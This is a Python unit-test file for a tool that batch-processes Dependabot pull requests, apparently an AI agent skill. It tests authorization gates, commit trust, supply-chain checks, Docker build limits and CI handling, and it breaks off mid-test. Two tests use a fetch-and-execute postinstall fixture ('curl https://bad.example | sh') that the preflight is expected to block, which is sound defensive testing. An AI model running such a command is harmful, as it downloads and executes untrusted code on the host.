#!/usr/bin/env python3
"""Focused unit tests for the deterministic Dependabot batch components."""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from types import SimpleNamespace


ROOT = Path(__file__).resolve().parents[4]
SCRIPT_DIR = Path(__file__).resolve().parents[1] / "scripts"
sys.path.insert(0, str(SCRIPT_DIR))
SPEC = importlib.util.spec_from_file_location("batch_process", SCRIPT_DIR / "batch_process.py")
assert SPEC and SPEC.loader
batch = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = batch
SPEC.loader.exec_module(batch)


def sha(letter: str) -> str:
    return letter * 40


def commit(letter: str = "b", *, actor: str = "dependabot[bot]", message: str = "Bump package") -> batch.CommitSnapshot:
    actor_type = "Bot" if actor.endswith("[bot]") else "User"
    return batch.CommitSnapshot(
        sha(letter),
        message,
        actor,
        actor,
        {},
        actor_type,
        actor_type,
        True,
        (sha("a"),),
    )


def pull_request(
    number: int = 1,
    *,
    label: bool = True,
    author: str | None = "dependabot[bot]",
    state: str = "open",
    draft: bool = False,
    base_ref: str = "main",
    base_sha: str = "a" * 40,
    head_sha: str = "b" * 40,
    commits: tuple[batch.CommitSnapshot, ...] | None = None,
    changed_files: tuple[str, ...] = ("projects/portal/package.json",),
    mergeable: str | None = "MERGEABLE",
) -> batch.PullRequestSnapshot:
    return batch.PullRequestSnapshot(
        number=number,
        html_url=f"https://github.com/u7chan/monorepo/pull/{number}",
        state=state,
        draft=draft,
        merged=False,
        labels=(batch.REQUIRED_LABEL,) if label else (),
        author_login=author,
        author_type="Bot" if author else "User",
        base_ref=base_ref,
        base_sha=base_sha,
        head_ref=f"dependabot/npm_and_yarn/portal-{number}",
        head_sha=head_sha,
        commits=commits if commits is not None else (commit(),),
        changed_files=changed_files,
        mergeable=mergeable,
    )


def metadata(version: str = "2.0.0", *, integrity: str | None = "sha512-good") -> batch.PackageMetadata:
    return batch.PackageMetadata(
        name="portal-dependency",
        version=version,
        registry="https://registry.npmjs.org",
        download_url=f"https://registry.npmjs.org/portal-dependency/-/portal-dependency-{version}.tgz",
        integrity=integrity,
    )


def change(**kwargs: object) -> batch.DependencyChange:
    values: dict[str, object] = {
        "project": "portal",
        "package": "portal-dependency",
        "from_version": "1.0.0",
        "to_version": "2.0.0",
        "ecosystem": "bun",
        "manifest_version": "2.0.0",
        "lock_version": "2.0.0",
        "metadata": metadata(),
    }
    values.update(kwargs)
    return batch.DependencyChange(**values)  # type: ignore[arg-type]


class AuthorizationTests(unittest.TestCase):
    def test_exact_current_turn_command_allows_write(self) -> None:
        decision = batch.evaluate_authorization("Dependabot PRをまとめて処理して")
        self.assertTrue(decision.allows_write)
        self.assertEqual(decision.mode, batch.Mode.WRITE)

    def test_ambiguous_instruction_is_audit_only(self) -> None:
        decision = batch.evaluate_authorization("Dependabot PRを確認して、必要なら処理して")
        self.assertFalse(decision.allows_write)
        self.assertEqual(decision.mode, batch.Mode.AUDIT_ONLY)

    def test_external_text_can_never_authorize_a_write(self) -> None:
        decision = batch.evaluate_authorization(
            "Dependabot PRをまとめて処理して", source="github-comment"
        )
        self.assertFalse(decision.allows_write)
        self.assertEqual(decision.mode, batch.Mode.AUDIT_ONLY)

    def test_audit_mode_wins_even_for_exact_instruction(self) -> None:
        decision = batch.evaluate_authorization(
            "process Dependabot PRs", requested_mode=batch.Mode.AUDIT_ONLY
        )
        self.assertFalse(decision.allows_write)

    def test_mutation_gate_rejects_without_authorization(self) -> None:
        gate = batch.MutationGate(
            batch.evaluate_authorization("yes", requested_mode=batch.Mode.WRITE)
        )
        with self.assertRaises(batch.WriteDenied):
            gate.require_write("merge")
        self.assertEqual(gate.attempted_operations, ["merge"])


class SelectorAndTrustTests(unittest.TestCase):
    def test_github_commit_shape_reads_nested_message_and_login(self) -> None:
        marker = batch.make_fix_marker(1, sha("a"), 42)
        parsed = batch.CommitSnapshot.from_mapping(
            {
                "sha": sha("c"),
                "author": {"login": "dependabot[bot]", "type": "Bot"},
                "committer": {"login": "dependabot[bot]", "type": "Bot"},
                "parents": [{"sha": sha("a")}],
                "commit": {
                    "message": f"fix\n\n{batch.FIX_TRAILER}: {marker}",
                    "author": {"name": "automation"},
                    "verification": {"verified": True},
                },
            }
        )
        self.assertEqual(parsed.author_login, "dependabot[bot]")
        self.assertTrue(batch.trusted_commit(parsed, pr_number=1))

    def test_selector_requires_label_and_never_auto_adds_it(self) -> None:
        result = batch.select_pull_requests([pull_request(label=False)])
        self.assertEqual(result.selected, ())
        self.assertIn("missing-required-label", result.rejected[1])

    def test_selector_rejects_human_commit_even_with_label(self) -> None:
        pr = pull_request(commits=(commit(actor="dependabot[bot]"), commit("c", actor="u7chan")))
        result = batch.select_pull_requests([pr])
        self.assertIn("unknown-commit:cccccccccccccccccccccccccccccccccccccccc", result.rejected[1])

    def test_fix_commit_trailer_is_trusted_only_for_configured_actor(self) -> None:
        marker = batch.make_fix_marker(1, sha("a"), 42)
        trusted = batch.CommitSnapshot(
            sha("c"),
            f"fix\n\n{batch.FIX_TRAILER}: {marker}",
            "github-actions[bot]",
            "github-actions[bot]",
            {},
            "Bot",
            "Bot",
            True,
            (sha("a"),),
        )
        chain = [
            batch.RepairCommitRecord(
                1, 42, sha("a"), sha("c"), marker,
                "github-actions[bot]", "github-actions[bot]",
            )
        ]
        self.assertTrue(batch.trusted_commit(trusted, pr_number=1, repair_chain=chain))
        self.assertFalse(batch.trusted_commit(trusted, pr_number=1))
        forged = batch.CommitSnapshot(
            sha("d"), f"fix\n\n{batch.FIX_TRAILER}: {marker}", "u7chan", "github-actions[bot]", {}, "User", "Bot", True, (sha("a"),)
        )
        self.assertFalse(batch.trusted_commit(forged, pr_number=1, repair_chain=chain))

    def test_mixed_dependabot_human_identity_is_rejected_even_when_verified(self) -> None:
        mixed = batch.CommitSnapshot(
            sha("c"),
            "Bump package",
            "human",
            "dependabot[bot]",
            {},
            "User",
            "Bot",
            True,
            (sha("a"),),
        )
        self.assertFalse(batch.trusted_commit(mixed, pr_number=1))

    def test_arbitrary_actions_trailer_without_skill_chain_is_rejected(self) -> None:
        marker = batch.make_fix_marker(1, sha("a"), 42)
        external = batch.CommitSnapshot(
            sha("c"),
            f"automated\n\n{batch.FIX_TRAILER}: {marker}",
            "github-actions[bot]",
            "github-actions[bot]",
            {},
            "Bot",
            "Bot",
            True,
            (sha("a"),),
        )
        self.assertFalse(batch.trusted_commit(external, pr_number=1))

    def test_selector_rejects_draft_non_default_and_closed_pr(self) -> None:
        result = batch.select_pull_requests(
            [pull_request(draft=True, base_ref="release", state="closed")]
        )
        reasons = result.rejected[1]
        self.assertIn("draft", reasons)
        self.assertIn("non-default-base", reasons)
        self.assertIn("not-open", reasons)

    def test_snapshot_requires_complete_commit_history(self) -> None:
        pr = pull_request()
        incomplete = batch.PullRequestSnapshot(**{**pr.__dict__, "commits_complete": False})
        result = batch.select_pull_requests([incomplete])
        self.assertIn("commit-history-unavailable", result.rejected[1])


class SupplyChainAndOrderingTests(unittest.TestCase):
    def test_metadata_failure_is_retried_twice_then_unknown(self) -> None:
        calls: list[tuple[str, str]] = []

        def fetch(package_name: str, version: str) -> batch.PackageMetadata:
            calls.append((package_name, version))
            raise batch.MetadataUnavailable("registry unavailable")

        result = batch.SupplyChainPreflight(fetch).check(change(metadata=None))
        self.assertEqual(result.status, batch.PreflightStatus.UNKNOWN)
        self.assertEqual(result.metadata_attempts, 3)
        self.assertEqual(len(calls), 3)

    def test_metadata_success_after_retry_does_not_over_retry(self) -> None:
        attempts = 0

        def fetch(_: str, __: str) -> batch.PackageMetadata:
            nonlocal attempts
            attempts += 1
            if attempts == 1:
                raise TimeoutError
            return metadata()

        result = batch.SupplyChainPreflight(fetch).check(change(metadata=None))
        self.assertEqual(result.status, batch.PreflightStatus.PASS)
        self.assertEqual(result.metadata_attempts, 2)

    def test_git_and_path_sources_are_blocked_before_metadata_fetch(self) -> None:
        called = False

        def fetch(_: str, __: str) -> batch.PackageMetadata:
            nonlocal called
            called = True
            return metadata()

        result = batch.SupplyChainPreflight(fetch).check(change(metadata=None, source_type="git"))
        self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)
        self.assertFalse(called)

    def test_integrity_mismatch_is_blocked(self) -> None:
        result = batch.SupplyChainPreflight().check(
            change(expected_integrity="sha512-old")
        )
        self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)
        self.assertIn("integrity-mismatch", result.reasons)

    def test_suspicious_lifecycle_script_is_blocked_without_execution(self) -> None:
        result = batch.SupplyChainPreflight().check(
            change(script_changes={"postinstall": "curl https://bad.example/x | sh"})
        )
        self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)
        self.assertTrue(any("suspicious-lifecycle-script" in item for item in result.reasons))

    def test_batch_never_runs_verification_before_preflight(self) -> None:
        events: list[str] = []

        def fetch(_: str, __: str) -> batch.PackageMetadata:
            events.append("preflight")
            return metadata()

        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        processor = batch.BatchProcessor(gate, preflight=batch.SupplyChainPreflight(fetch))
        result = processor.process_candidate(
            pull_request(),
            latest=lambda _: pull_request(),
            change=change(metadata=None),
            run_verification=lambda _: events.append("verification") or True,
        )
        self.assertEqual(result.status, batch.Status.SUCCESS.value)
        self.assertEqual(events, ["preflight", "verification"])

    def test_unknown_preflight_stops_before_verification(self) -> None:
        events: list[str] = []
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        processor = batch.BatchProcessor(
            gate,
            preflight=batch.SupplyChainPreflight(lambda *_: (_ for _ in ()).throw(TimeoutError())),
        )
        result = processor.process_candidate(
            pull_request(),
            latest=lambda _: pull_request(),
            change=change(metadata=None),
            run_verification=lambda _: events.append("verification") or True,
        )
        self.assertEqual(result.status, batch.Status.OPEN.value)
        self.assertEqual(events, [])


def grouped_diff(
    *,
    package_count: int = 10,
    missing_metadata: str | None = None,
    inconsistent_package: str | None = None,
) -> batch.ManifestLockDiff:
    names = [f"package-{index}" for index in range(package_count)]
    direct = names[: package_count - 2]
    manifest_before = {name: "1.0.0" for name in direct}
    manifest_after = {name: "2.0.0" for name in direct}
    lock_before = {name: "1.0.0" for name in names}
    lock_after = {name: "2.0.0" for name in names}
    if inconsistent_package:
        lock_after[inconsistent_package] = "3.0.0"
    metadata_by_name = {
        name: batch.PackageMetadata(
            name=name,
            version="2.0.0",
            registry="https://registry.npmjs.org",
            download_url=f"https://registry.npmjs.org/{name}/-/{name}-2.0.0.tgz",
            integrity=f"sha512-{name}",
        )
        for name in names
        if name != missing_metadata
    }
    return batch.ManifestLockDiff(
        "portal",
        "bun",
        manifest_before,
        manifest_after,
        lock_before,
        lock_after,
        metadata_by_name,
    )


class GroupedDependencyTests(unittest.TestCase):
    def test_realistic_grouped_fixture_reconstructs_all_direct_and_transitive_members(self) -> None:
        diff = grouped_diff()
        reconstruction = batch.reconstruct_grouped_changes(diff)
        self.assertTrue(reconstruction.complete)
        self.assertEqual(len(reconstruction.changes), 10)
        self.assertEqual(sum(change.direct for change in reconstruction.changes), 8)
        preflight = batch.SupplyChainPreflight().check_grouped(
            reconstruction.changes,
            reconstruction_errors=reconstruction.errors,
        )
        self.assertTrue(preflight.complete)
        self.assertEqual(len(preflight.member_results), 10)

    def test_added_and_removed_lock_members_are_not_dropped(self) -> None:
        diff = batch.ManifestLockDiff(
            "portal",
            "bun",
            {"direct": "1.0.0"},
            {"direct": "2.0.0", "added-transitive": "1.0.0"},
            {"direct": "1.0.0", "removed-transitive": "1.0.0"},
            {"direct": "2.0.0", "added-transitive": "1.0.0"},
            {
                "direct": batch.PackageMetadata("direct", "2.0.0", "https://registry.npmjs.org", "https://registry.npmjs.org/direct.tgz", "sha512-direct"),
                "added-transitive": batch.PackageMetadata("added-transitive", "1.0.0", "https://registry.npmjs.org", "https://registry.npmjs.org/added.tgz", "sha512-added"),
                "removed-transitive": batch.PackageMetadata("removed-transitive", "1.0.0", "https://registry.npmjs.org", "https://registry.npmjs.org/removed.tgz", "sha512-removed"),
            },
        )
        reconstruction = batch.reconstruct_grouped_changes(diff)
        self.assertEqual(
            {change.package: (change.from_version, change.to_version) for change in reconstruction.changes},
            {
                "direct": ("1.0.0", "2.0.0"),
                "added-transitive": ("absent", "1.0.0"),
                "removed-transitive": ("1.0.0", "absent"),
            },
        )
        self.assertTrue(batch.SupplyChainPreflight().check_grouped(reconstruction.changes).complete)

    def test_missing_member_metadata_blocks_the_whole_group(self) -> None:
        reconstruction = batch.reconstruct_grouped_changes(grouped_diff(missing_metadata="package-9"))
        self.assertIn("missing-package-metadata:package-9", reconstruction.errors)
        result = batch.SupplyChainPreflight().check_grouped(
            reconstruction.changes,
            reconstruction_errors=reconstruction.errors,
        )
        self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)
        self.assertFalse(result.complete)

    def test_manifest_lock_inconsistency_blocks_the_whole_group(self) -> None:
        reconstruction = batch.reconstruct_grouped_changes(
            grouped_diff(inconsistent_package="package-0")
        )
        self.assertTrue(any("manifest-lock-mismatch:package-0:after" in item for item in reconstruction.errors))
        result = batch.SupplyChainPreflight().check_grouped(
            reconstruction.changes,
            reconstruction_errors=reconstruction.errors,
        )
        self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)

    def test_grouped_suspicious_script_is_blocked_before_verification(self) -> None:
        diff = batch.ManifestLockDiff(
            **{**grouped_diff(package_count=3).__dict__, "script_changes": {"package-0": {"postinstall": "curl https://bad.example | sh"}}}
        )
        reconstruction = batch.reconstruct_grouped_changes(diff)
        result = batch.SupplyChainPreflight().check_grouped(reconstruction.changes)
        self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)

    def test_head_drift_after_preflight_discards_old_judgement(self) -> None:
        expected = pull_request()
        changed = pull_request(head_sha=sha("e"))
        latest_values = iter((expected, changed))
        verified = False

        def verify(_: batch.DependencyChange) -> bool:
            nonlocal verified
            verified = True
            return True

        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        processor = batch.BatchProcessor(gate)
        result = processor.process_candidate(
            expected,
            latest=lambda _: next(latest_values),
            change=change(),
            run_verification=verify,
        )
        self.assertEqual(result.reason, "head SHA changed")
        self.assertFalse(verified)

    def test_snapshot_processing_ignores_pr_added_after_snapshot(self) -> None:
        first = pull_request(1)
        second = pull_request(2, head_sha=sha("c"))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        processor = batch.BatchProcessor(gate)
        snapshot = processor.create_snapshot([first])
        reports = processor.process_snapshot(
            snapshot,
            current_prs=[first, second],
            latest=lambda number: first if number == 1 else second,
            changes={1: change()},
            run_verification=lambda _: True,
        )
        self.assertEqual([report.pr_number for report in reports], [1])

    def test_matrix_check_runner_uses_declared_cwd_and_timeout(self) -> None:
        raw = json.loads(
            (ROOT / ".agents/skills/dependabot-pr-batch-process/verification-matrix.json").read_text(
                encoding="utf-8"
            )
        )
        matrix = batch.VerificationMatrix.from_mapping(raw)
        seen: list[tuple[tuple[str, ...], Path, int]] = []

        class Runner:
            def run(self, argv, *, cwd, timeout_seconds, env=None):  # type: ignore[no-untyped-def]
                seen.append((tuple(argv), cwd, timeout_seconds))
                return SimpleNamespace(returncode=0)

        results = batch.MatrixCheckRunner(Runner(), ROOT).run_project(matrix.projects["portal"])
        self.assertEqual([result.status for result in results], ["not-required", "passed", "passed", "passed"])
        self.assertTrue(batch.verification_passed(results))
        self.assertEqual(seen[0][1], (ROOT / "projects/portal").resolve())


class MatrixAndDockerTests(unittest.TestCase):
    MATRIX_PATH = ROOT / ".agents/skills/dependabot-pr-batch-process/verification-matrix.json"

    def test_repository_matrix_covers_dependabot_config(self) -> None:
        raw = json.loads(self.MATRIX_PATH.read_text(encoding="utf-8"))
        matrix = batch.VerificationMatrix.from_mapping(raw)
        errors = batch.validate_repository_matrix(
            matrix,
            repository_root=ROOT,
            dependabot_config=ROOT / ".github/dependabot.yml",
        )
        self.assertEqual(errors, [])
        self.assertEqual(matrix.max_docker_concurrency, 2)

    def test_missing_required_docker_target_is_not_fallback_success(self) -> None:
        raw = {
            "version": 1,
            "docker": {"max_concurrency": 2, "default_timeout_seconds": 60},
            "projects": {
                "example": {
                    "path": "projects/example",
                    "ecosystem": "bun",
                    "checks": [
                        {"id": "test", "kind": "test", "required": True, "argv": ["bun", "test"], "timeout_seconds": 60}
                    ],
                    "docker": {
                        "test": {"target": "test", "required": True, "timeout_seconds": 60},
                        "final": {"target": "final", "required": False, "timeout_seconds": 60},
                    },
                }
            },
        }
        matrix = batch.VerificationMatrix.from_mapping(raw)
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            project = root / "projects/example"
            project.mkdir(parents=True)
            (project / "Dockerfile").write_text("FROM alpine AS final\n", encoding="utf-8")
            with self.assertRaises(batch.MatrixError):
                batch.docker_specs_for_project(matrix, "example", repository_root=root, commit_sha=sha("a"))

    def test_optional_missing_test_target_is_skipped_not_passed(self) -> None:
        raw = json.loads(self.MATRIX_PATH.read_text(encoding="utf-8"))
        matrix = batch.VerificationMatrix.from_mapping(raw)
        specs = batch.docker_specs_for_project(
            matrix, "edit-vid", repository_root=ROOT, commit_sha=sha("a")
        )
        self.assertEqual([spec.stage for spec in specs], ["final"])

    def test_docker_runner_has_max_two_active_builds_and_cleans_exact_images(self) -> None:
        lock = threading.Lock()
        active = 0
        max_active = 0
        commands: list[tuple[str, ...]] = []

        class Runner:
            def run(self, argv, *, cwd, timeout_seconds, env=None):  # type: ignore[no-untyped-def]
                nonlocal active, max_active
                with lock:
                    active += 1
                    max_active = max(max_active, active)
                    commands.append(tuple(argv))
                time.sleep(0.02)
                with lock:
                    active -= 1
                return SimpleNamespace(returncode=0)

        class Cleaner:
            def __init__(self) -> None:
                self.images: list[str] = []

            def image_exists(self, tag: str) -> bool:
                return False

            def image_owned(self, tag: str, invocation_id: str) -> bool:
                return True

            def remove_image(self, tag: str) -> None:
                self.images.append(tag)

            def remove_worktree(self, path: Path) -> None:
                raise AssertionError("no worktree was tracked")

        cleaner = Cleaner()
        invocation_id = "run-12345678"
        docker = batch.DockerBatchRunner(Runner(), cleaner, repository_root=ROOT, invocation_id=invocation_id)
        specs = tuple(
            batch.DockerBuildSpec(
                "portal", "projects/portal", stage,
                f"dependabot-batch/{invocation_id}/portal/{stage}:{index}",
                sha("a"), 30, invocation_id,
            )
            for index, stage in enumerate(("test", "final", "test", "final"))
        )
        results = docker.run(specs)
        self.assertEqual(max_active, 2)
        self.assertEqual([result.status for result in results], ["passed"] * 4)
        self.assertEqual(sorted(cleaner.images), sorted(spec.image_tag for spec in specs))
        self.assertTrue(
            all(any(batch.DOCKER_OWNERSHIP_LABEL in item for item in command) for command in commands)
        )
        self.assertTrue(all("--mount" not in command and "--secret" not in command for command in commands))
        self.assertFalse(any("system" in command and "prune" in command for command in commands))

    def test_docker_timeout_isolated_and_cleanup_still_runs(self) -> None:
        class Runner:
            def run(self, argv, *, cwd, timeout_seconds, env=None):  # type: ignore[no-untyped-def]
                raise subprocess.TimeoutExpired(argv, timeout_seconds)

        class Cleaner:
            def __init__(self) -> None:
                self.images: list[str] = []

            def image_exists(self, tag: str) -> bool:
                return False

            def image_owned(self, tag: str, invocation_id: str) -> bool:
                return False

            def remove_image(self, tag: str) -> None:
                self.images.append(tag)

            def remove_worktree(self, path: Path) -> None:
                pass

        invocation_id = "run-timeout1"
        spec = batch.DockerBuildSpec(
            "portal", "projects/portal", "test",
            f"dependabot-batch/{invocation_id}/portal/test:1", sha("a"), 1, invocation_id,
        )
        cleaner = Cleaner()
        result = batch.DockerBatchRunner(
            Runner(), cleaner, repository_root=ROOT, invocation_id=invocation_id
        ).run((spec,))[0]
        self.assertEqual(result.status, "timeout")
        self.assertEqual(cleaner.images, [])
        self.assertFalse(result.cleanup_attempted)

    def test_concurrency_three_is_rejected(self) -> None:
        with self.assertRaises(batch.MatrixError):
            batch.DockerBatchRunner(SimpleNamespace(), SimpleNamespace(), repository_root=ROOT, max_concurrency=3)

    def test_preexisting_collision_never_builds_or_removes_external_image(self) -> None:
        invocation_id = "run-collision1"
        spec = batch.DockerBuildSpec(
            "portal", "projects/portal", "test",
            f"dependabot-batch/{invocation_id}/portal/test:1", sha("a"), 1, invocation_id,
        )
        calls: list[tuple[str, ...]] = []

        class Runner:
            def run(self, argv, *, cwd, timeout_seconds, env=None):  # type: ignore[no-untyped-def]
                calls.append(tuple(argv))
                raise AssertionError("colliding image must not build")

        class Cleaner:
            def __init__(self) -> None:
                self.removed: list[str] = []

            def image_exists(self, tag: str) -> bool:
                return True

            def image_owned(self, tag: str, invocation_id: str) -> bool:
                raise AssertionError("ownership probe is not needed for collision")

            def remove_image(self, tag: str) -> None:
                self.removed.append(tag)

            def worktree_exists(self, path: Path) -> bool:
                return False

            def remove_worktree(self, path: Path) -> None:
                pass

        cleaner = Cleaner()
        result = batch.DockerBatchRunner(
            Runner(), cleaner, repository_root=ROOT, invocation_id=invocation_id
        ).run((spec,))[0]
        self.assertEqual(result.status, "collision")
        self.assertEqual(calls, [])
        self.assertEqual(cleaner.removed, [])

    def test_failed_build_cleans_only_image_proven_owned_by_this_invocation(self) -> None:
        invocation_id = "run-failure1"
        spec = batch.DockerBuildSpec(
            "portal", "projects/portal", "test",
            f"dependabot-batch/{invocation_id}/portal/test:1", sha("a"), 1, invocation_id,
        )

        class Runner:
            def run(self, argv, *, cwd, timeout_seconds, env=None):  # type: ignore[no-untyped-def]
                return SimpleNamespace(returncode=1)

        class Cleaner:
            def __init__(self) -> None:
                self.removed: list[str] = []

            def image_exists(self, tag: str) -> bool:
                return False

            def image_owned(self, tag: str, invocation_id: str) -> bool:
                return True

            def remove_image(self, tag: str) -> None:
                self.removed.append(tag)

            def worktree_exists(self, path: Path) -> bool:
                return False

            def remove_worktree(self, path: Path) -> None:
                pass

        cleaner = Cleaner()
        result = batch.DockerBatchRunner(
            Runner(), cleaner, repository_root=ROOT, invocation_id=invocation_id
        ).run((spec,))[0]
        self.assertEqual(result.status, "failed")
        self.assertTrue(result.image_created)
        self.assertEqual(cleaner.removed, [spec.image_tag])

    def test_worktree_cleanup_requires_absent_before_tracking(self) -> None:
        invocation_id = "run-worktree1"

        class Runner:
            def run(self, argv, *, cwd, timeout_seconds, env=None):  # type: ignore[no-untyped-def]
                return SimpleNamespace(returncode=0)

        class Cleaner:
            def __init__(self) -> None:
                self.removed: list[Path] = []

            def image_exists(self, tag: str) -> bool:
                return False

            def image_owned(self, tag: str, invocation_id: str) -> bool:
                return False

            def remove_image(self, tag: str) -> None:
                pass

            def worktree_exists(self, path: Path) -> bool:
                return False

            def remove_worktree(self, path: Path) -> None:
                self.removed.append(path)

        cleaner = Cleaner()
        runner = batch.DockerBatchRunner(
            Runner(), cleaner, repository_root=ROOT, invocation_id=invocation_id
        )
        worktree = ROOT / ".git" / "dependabot-batch" / invocation_id
        self.assertTrue(runner.track_worktree(worktree))
        runner.run(())
        self.assertEqual(cleaner.removed, [worktree.resolve()])


class FootprintAndCITests(unittest.TestCase):
    def test_independent_projects_share_a_wave(self) -> None:
        items = [
            batch.FootprintedItem(1, batch.footprint_for_paths(["projects/portal/src/a.ts"])),
            batch.FootprintedItem(2, batch.footprint_for_paths(["projects/portfolio/src/a.ts"])),
            batch.FootprintedItem(3, batch.footprint_for_paths(["projects/portal/src/b.ts"])),
        ]
        waves = batch.schedule_footprints(items)
        self.assertEqual([[item.identifier for item in wave] for wave in waves], [[1, 2], [3]])

    def test_global_footprint_serializes_with_everything(self) -> None:
        items = [
            batch.FootprintedItem(1, batch.footprint_for_paths(["projects/portal/x"])),
            batch.FootprintedItem(2, batch.footprint_for_paths([".github/workflows/x.yml"])),
            batch.FootprintedItem(3, batch.footprint_for_paths(["projects/portfolio/x"])),
        ]
        waves = batch.schedule_footprints(items)
        self.assertEqual([[item.identifier for item in wave] for wave in waves], [[1], [2], [3]])

    def test_ci_success_and_dependency_classification(self) -> None:
        checks = (batch.CheckObservation("ci", "completed", "success"),)
        self.assertEqual(
            batch.classify_ci(batch.CIObservation(sha("a"), checks), expected_head_sha=sha("a")),
            batch.CIClassification.SUCCESS,
        )
        self.assertEqual(
            batch.classify_ci(
                batch.CIObservation(
                    sha("a"),
                    (batch.CheckObservation("ci", "completed", "failure"),),
                    main_success=True,
                    pr_reproducible=True,
                    dependency_causation=True,
                ),
                expected_head_sha=sha("a"),
            ),
            batch.CIClassification.DEPENDENCY_CAUSED,
        )

    def test_ci_waiter_retries_transient_once(self) -> None:
        class Clock:
            def __init__(self) -> None:
                self.now = 0.0

            def monotonic(self) -> float:
                return self.now

            def sleep(self, seconds: float) -> None:
                self.now += seconds

        observations = iter(
            (
                batch.CIObservation(sha("a"), (batch.CheckObservation("ci", "completed", "failure"),), failure_code="runner-failure"),
                batch.CIObservation(sha("a"), (batch.CheckObservation("ci", "completed", "success"),)),
            )
        )
        reruns: list[int] = []
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        result = batch.CIWaiter(Clock()).wait(
            sha("a"), lambda _: next(observations), lambda _: reruns.append(1), gate=gate
        )
        self.assertEqual(result.classification, batch.CIClassification.SUCCESS)
        self.assertEqual(result.reruns, 1)
        self.assertEqual(len(reruns), 1)

    def test_ci_waiter_does_not_rerun_in_audit_mode(self) -> None:
        observation = batch.CIObservation(
            sha("a"),
            (batch.CheckObservation("ci", "completed", "failure"),),
            failure_code="runner-failure",
        )
        reruns: list[int] = []
        gate = batch.MutationGate(batch.evaluate_authorization(None, requested_mode=batch.Mode.AUDIT_ONLY))
        result = batch.CIWaiter().wait(sha("a"), lambda _: observation, lambda _: reruns.append(1), gate=gate)
        self.assertEqual(result.classification, batch.CIClassification.WRITE_NOT_AUTHORIZED)
        self.assertEqual(reruns, [])

    def test_ci_deadline_is_absolute_and_timeout_is_unknown_for_disposition(self) -> None:
        class Clock:
            def __init__(self) -> None:
                self.now = 0.0

            def monotonic(self) -> float:
                return self.now

            def sleep(self, seconds: float) -> None:
                self.now += seconds

        running = batch.CIObservation(sha("a"), (batch.CheckObservation("ci", "in_progress"),))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        result = batch.CIWaiter(Clock(), poll_seconds=10, deadline_seconds=25).wait(
            sha("a"), lambda _: running, lambda _: None, gate=gate
        )
        self.assertEqual(result.classification, batch.CIClassification.TIMEOUT)
        self.assertEqual(batch.disposition_for(classification=result.classification.value), "open")


class CycleMergeAndTOCTOUTests(unittest.TestCase):
    def test_repair_controller_is_bounded_at_two_cycles(self) -> None:
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        controller = batch.RepairCycleController(gate)
        commits: list[batch.FixCommit] = []

        def create(diagnosis: batch.RepairDiagnosis, marker: str, message: str) -> batch.FixCommit:
            parent = sha("a") if not commits else commits[-1].sha
            return batch.FixCommit(
                sha("c" if not commits else "d"), message, marker,
                1, 7, parent, "github-actions[bot]", "github-actions[bot]",
                True, (parent,), True,
            )

        def push(_: str, new: batch.FixCommit) -> None:
            commits.append(new)

        result = controller.run(
            pr_number=1,
            run_id=7,
            initial_head_sha=sha("a"),
            current_head=lambda: commits[-1].sha if commits else sha("a"),
            diagnose=lambda cycle, _: batch.RepairDiagnosis(True, True, f"fix {cycle}"),
            create_commit=create,
            push=push,
            wait_for_ci=lambda _: batch.CIResult(batch.CIClassification.DEPENDENCY_CAUSED, "still fails", sha("a")),
        )
        self.assertEqual(result.cycles, 2)
        self.assertEqual(len(result.commits), 2)
        self.assertEqual(result.reason, "maximum-two-cycles-reached")
        first = result.commits[0]
        observed = batch.CommitSnapshot(
            first.sha,
            first.message,
            first.author_login,
            first.committer_login,
            {},
            "Bot",
            "Bot",
            first.verification_verified,
            first.parents,
        )
        self.assertTrue(batch.trusted_commit(observed, pr_number=1, repair_chain=controller.repair_chain))

    def test_repair_controller_does_not_commit_after_head_drift(self) -> None:
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        calls: list[str] = []
        result = batch.RepairCycleController(gate).run(
            pr_number=1,
            run_id=7,
            initial_head_sha=sha("a"),
            current_head=lambda: sha("b"),
            diagnose=lambda *_: calls.append("diagnose") or batch.RepairDiagnosis(True, True, "fix"),
            create_commit=lambda *_: (_ for _ in ()).throw(AssertionError("must not commit")),
            push=lambda *_: None,
            wait_for_ci=lambda _: (_ for _ in ()).throw(AssertionError("must not wait")),
        )
        self.assertEqual(result.reason, "head-drift-before-fix")
        self.assertEqual(calls, [])

    def test_repair_controller_has_no_write_in_audit_mode(self) -> None:
        gate = batch.MutationGate(batch.evaluate_authorization(None, requested_mode=batch.Mode.AUDIT_ONLY))
        calls: list[str] = []
        result = batch.RepairCycleController(gate).run(
            pr_number=1,
            run_id=7,
            initial_head_sha=sha("a"),
            current_head=lambda: sha("a"),
            diagnose=lambda *_: batch.RepairDiagnosis(True, True, "fix"),
            create_commit=lambda *_: calls.append("commit") or batch.FixCommit(sha("c"), "bad", "bad"),
            push=lambda *_: calls.append("push"),
            wait_for_ci=lambda _: batch.CIResult(batch.CIClassification.SUCCESS, "ok", sha("c")),
        )
        self.assertEqual(result.reason, "write-not-authorized")
        self.assertEqual(calls, [])

    def test_expected_sha_gate_blocks_action_on_drift(self) -> None:
        expected = pull_request()
        current = pull_request(head_sha=sha("e"))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        called: list[str] = []
        with self.assertRaises(batch.SnapshotDrift):
            batch.ExpectedSHAWriter(gate).run(
                "merge",
                expected,
                lambda: current,
                lambda *_: called.append("action"),
            )
        self.assertEqual(called, [])

    def test_expected_sha_gate_blocks_action_on_base_drift(self) -> None:
        expected = pull_request()
        current = pull_request(base_sha=sha("e"))
